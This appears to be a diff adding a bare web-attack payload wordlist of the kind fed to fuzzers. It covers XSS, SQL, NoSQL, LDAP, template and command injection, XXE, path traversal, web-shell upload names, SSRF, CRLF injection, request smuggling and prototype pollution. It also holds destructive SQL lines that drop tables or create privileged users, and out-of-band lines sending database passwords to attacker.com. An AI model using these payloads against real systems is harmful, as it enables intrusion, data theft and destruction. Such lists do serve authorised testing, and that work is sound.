@@ -1,0 +1,342 @@
+qwe'"<x</
+qwe'"><x</
+qwe'"><x//
+qwe'"><x//
+qwe'"><x</x>
+qwe'"><x</ x>
+qwe'"><x</x x>
+qwe'"><x</x x=x>
+qwe'"><x</x x='x'>
+qwe'"><x</x x="x">
+qwe'"><x</x x=`x`>
+'-alert(1)-'
+'-alert(1)//
+'-alert(1)/*
+'-alert(1)`
+'-alert(1)"
+'-alert(1)'
+'"-alert(1)-"
+'"><script>alert(1)</script>
+'"><img src=x onerror=alert(1)>
+'"><svg onload=alert(1)>
+'"><body onload=alert(1)>
+'"><iframe src=javascript:alert(1)>
+'"><x onmouseover=alert(1)>
+'"><x onclick=alert(1)>
+'"><x onfocus=alert(1) autofocus>
+'"><x onerror=alert(1) src=x>
+'"><marquee onstart=alert(1)>
+'"><details open ontoggle=alert(1)>
+'"><select onfocus=alert(1) autofocus>
+'"><input onfocus=alert(1) autofocus>
+'"><textarea onfocus=alert(1) autofocus>
+'"><button onfocus=alert(1) autofocus>
+'";alert(1)//
+'";alert(1);//
+'";alert(1);"
+'";alert(1);'
+'";alert(String.fromCharCode(88,83,83))//
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+${{7*7}}
+#{7*7}
+%{7*7}
+|id
+;id
+`id`
+$(id)
+;$(id)
+|$(id)
+`$(id)`
+";id"
+';id'
+'";id
+";id'
+'|id
+"|id
+`;id
+' OR '1'='1
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+' OR '1'='1'--
+' OR '1'='1'#
+' OR '1'='1'/*
+" OR "1"="1
+" OR 1=1--
+" OR 1=1#
+" OR 1=1/*
+{"$ne": null}
+{"$gt": ""}
+{"$regex": ".*"}
+{"$where": "this.password.length > 0"}
+*)(uid=*))(&(uid=*
+*)(uid=*))(|(uid=*
+' or '1'='1
+' or ''='
+' or 1=1 or ''='
+" or "1"="1
+<foo></foo>
+<foo/><!--
+<![CDATA[<script>alert(1)</script>]]>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"$where": "this.password.match(/.*/)"}
+'"><script>alert(1)</script><x='
+'"><img src=x onerror=alert(1)><x='
+'"><svg onload=alert(1)><x='
+'"><iframe src=javascript:alert(1)><x='
+'"><body onload=alert(1)><x='
+'"><input onfocus=alert(1) autofocus><x='
+'"><select onfocus=alert(1) autofocus><x='
+'"><textarea onfocus=alert(1) autofocus><x='
+'"><button onfocus=alert(1) autofocus><x='
+'"><a href="javascript:alert(1)">click</a><x='
+<Img src=x OnErRoR=alert(1)>
+<ScRiPt>alert(1)</ScRiPt>
+<svg onload=alert(1)>
+<svg onload=alert&#40;1&#41;>
+<svg onload=alert&#x28;1&#x29;>
+<svg onload=&#97;&#108;&#101;&#114;&#116;&#40;1&#41;>
+<svg onload=eval(atob('YWxlcnQoMSk='))>
+?param=value&param=value
+?param[]=value&param[]=value2
+?param=value%00injected
+?param=value%0ainjected
+?param=value%0dinjected
+?param=value%0d%0ainjected
+X-Forwarded-Host: attacker.com
+X-Forwarded-For: 127.0.0.1
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+X-HTTP-Method-Override: PUT
+%27%22%3E%3C
+%2527%2522%253E%253C
+&#39;&#34;&gt;&lt;
+&apos;&quot;&gt;&lt;
+\x27\x22\x3e\x3c
+\u0027\u0022\u003e\u003c
+%00
+%00.jpg
+%00.php
+%00.txt
+%00.html
+../../../etc/passwd
+....//....//....//etc/passwd
+..%2f..%2f..%2fetc%2fpasswd
+..%252f..%252f..%252fetc%252fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+shell.php.jpg
+shell.php%00.jpg
+shell.php;.jpg
+shell.php%20
+shell.php.
+shell.php...
+shell.pHp
+shell.PHp
+shell.php5
+shell.phtml
+shell.shtml
+shell.asp
+shell.aspx
+shell.jsp
+shell.jspx
+shell.war
+shell.jar
+shell.py
+shell.rb
+shell.pl
+shell.cgi
+shell.sh
+shell.bash
+shell.zsh
+shell.csh
+shell.tcsh
+shell.ksh
+shell.awk
+shell.sed
+shell.php.gif
+shell.php.png
+shell.php.bmp
+shell.php.txt
+shell.php.pdf
+shell.php.doc
+shell.php.docx
+shell.php.xls
+shell.php.xlsx
+shell.php.ppt
+shell.php.pptx
+shell.php.zip
+shell.php.rar
+shell.php.7z
+shell.php.tar
+shell.php.gz
+shell.php.bz2
+shell.php.xz
+shell.php.lz
+shell.php.lzma
+shell.php.lzo
+shell.php.zst
+http://127.0.0.1
+http://localhost
+http://0.0.0.0
+http://[::1]
+http://[0:0:0:0:0:0:0:1]
+http://0177.0.0.1
+http://2130706433
+http://3232235521
+http://3232235777
+http://2852039166
+file:///etc/passwd
+dict://localhost:11211/
+gopher://localhost:9000/
+ftp://localhost:21/
+tftp://localhost:69/
+ldap://localhost:389/
+//attacker.com
+///attacker.com
+////attacker.com
+https://attacker.com
+http://attacker.com
+//attacker.com/
+///attacker.com/
+////attacker.com/
+https://attacker.com/
+http://attacker.com/
+//attacker.com//
+///attacker.com//
+////attacker.com//
+https://attacker.com//
+http://attacker.com//
+//attacker.com/%2f..
+///attacker.com/%2f..
+////attacker.com/%2f..
+https://attacker.com/%2f..
+http://attacker.com/%2f..
+//attacker.com/%2f%2e%2e
+///attacker.com/%2f%2e%2e
+////attacker.com/%2f%2e%2e
+https://attacker.com/%2f%2e%2e
+http://attacker.com/%2f%2e%2e
+%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>
+%0d%0aLocation:%20http://attacker.com%0d%0a
+%0d%0aSet-Cookie:%20session=admin%0d%0a
+?race=1&race=2&race=3
+?limit=100&limit=1000&limit=unlimited
+?amount=10&amount=-10&amount=0
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJhZG1pbiI6dHJ1ZX0.
+eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0.
+{__typename}
+{__schema{types{name}}}
+{__schema{queryType{name}}}
+{__schema{mutationType{name}}}
+{__schema{subscriptionType{name}}}
+{__schema{directives{name description locations args{name description type{name}}}}}}
+{__type(name:"User"){name fields{name type{name}}}}
+{"type":"connect","payload":{"headers":{"Authorization":"Bearer admin"}}}
+{"type":"connection_init","payload":{"headers":{"Authorization":"Bearer admin"}}}
+{"__proto__":{"isAdmin":true}}
+{"constructor":{"prototype":{"isAdmin":true}}}
+{"__proto__":{"toString":"123","valueOf":"123"}}
+{"__proto__":{"polluted":"yes"}}
+X-Forwarded-Host: attacker.com
+X-Forwarded-Scheme: https
+X-HTTP-Method-Override: POST
+X-Original-URL: /admin
+O:4:"User":2:{s:8:"username";s:5:"admin";s:7:"isAdmin";b:1;}
+rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHESHVrVR5XQwAGSQAGc2l6ZQdaAAZtb2RDb3VudEkABnNpemUwTAAHZWxlbWVudHN0ABNbTGphdmEvbGFuZy9PYmplY3Q7eHAAAAAHAAAAA3VyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJ0AAZIZWxsb3QABXdvcmxk
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 4
+Transfer-Encoding: chunked
+
+5c
+GET /admin HTTP/1.1
+Host: target.com
+Content-Length: 5
+
+x=1
+0
+%0d%0a[INFO]%20User%20logged%20in%20as%20admin
+%0a[INFO]%20User%20logged%20in%20as%20admin
+%0d[INFO]%20User%20logged%20in%20as%20admin
+attacker@example.com%0abcc:admin@example.com
+attacker@example.com%0dcc:admin@example.com
+attacker@example.com%0abcc:admin@example.com%0asubject:Hacked
+target.com.attacker.com
+attacker.com/target.com
+target.com?attacker.com
+target.com#attacker.com
+target.com\@attacker.com
+target.com%5c%5c.attacker.com
+target.com%2f%2f.attacker.com
+target.com%3f.attacker.com
+target.com%23.attacker.com
+target.com%40.attacker.com
+target.com%252f%252f.attacker.com
+target.com%252e%252e%252f.attacker.com
+?user=admin&user=guest
+?user[]=admin&user[]=guest
+?user[0]=admin&user[1]=guest
+?user.name=admin&user.role=admin
+?id=1&id=2&id=3
+?action=delete&action=create
+?enabled=true&enabled=false
+SCRIPT
+ALERT
+ONERROR
+ONLOAD
+ONCLICK
+JAVASCRIPT
+DOCUMENT
+LOCATION
+COOKIE
+0dmin.com (Cyrillic '0')
+0@@le.com (Cyrillic '@')
+g>>gle.com (Cyrillic '>')
+micr>soft.com (Cyrillic '>')
+f0cebook.com (Cyrillic '0')
+' AND SLEEP(5)--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+' AND pg_sleep(5)--
+' AND WAITFOR DELAY '0:0:5'--
+' AND 1=(SELECT 1 FROM (SELECT SLEEP(5))a)--
+' AND benchmark(5000000,MD5(1))--
+' AND 1=1--
+' AND 1=2--
+' AND '1'='1
+' AND '1'='2
+' AND 1=1#
+' AND 1=2#
+' AND 1=1/*
+' AND 1=2/*
+' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--
+' AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT (SELECT CONCAT(CAST(database() AS CHAR),0x7e)) FROM information_schema.tables LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' UNION SELECT null--
+' UNION SELECT null,null--
+' UNION SELECT null,null,null--
+' UNION SELECT 1,2,3--
+' UNION SELECT 'a','b','c'--
+' UNION SELECT @@version,user(),database()--
+' UNION SELECT table_name,2,3 FROM information_schema.tables--
+'; DROP TABLE users--
+'; DELETE FROM users--
+'; INSERT INTO users VALUES ('admin','password')--
+'; UPDATE users SET password='hacked' WHERE username='admin'--
+'; CREATE USER attacker IDENTIFIED BY 'password'--
+'; GRANT ALL PRIVILEGES ON *.* TO attacker--
+'; DROP TABLE users--
+'; DELETE FROM users--
+'; INSERT INTO users VALUES ('admin','password')--
+'; UPDATE users SET password='hacked' WHERE username='admin'--
+'; CREATE USER attacker IDENTIFIED BY 'password'--
+'; GRANT ALL PRIVILEGES ON *.* TO attacker--
+' AND LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 0,1),'.attacker.com\\a.txt'))--
+' AND (SELECT LOAD_FILE(CONCAT('//attacker.com/',(SELECT password FROM users LIMIT 0,1))))--
+'; COPY (SELECT '') TO PROGRAM 'nslookup $(whoami).attacker.com'--
+'; EXEC master..xp_dirtree '\\attacker.com\share'--
+' AND UTL_HTTP.request('http://attacker.com/?data='||(SELECT password FROM users WHERE ROWNUM=1)) IS NOT NULL--
